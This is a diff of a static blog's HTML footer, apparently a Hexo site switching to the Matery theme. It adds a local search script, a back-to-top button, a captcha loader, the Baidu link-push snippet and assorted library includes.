+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
     
 
+    
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+    <!-- 雪花特效 -->
+    
 
+    <!-- 鼠标星星特效 -->
+    
 
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <!-- Baidu Analytics -->
 
+    <!-- Baidu Push -->
 
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
 
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
 
-<script src="/js/script.js"></script>
+    
 
+    
 
+    <!--腾讯兔小巢-->
+    
+    
 
+    
 
+    
 
-  </div>
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
 </body>
+
 </html>
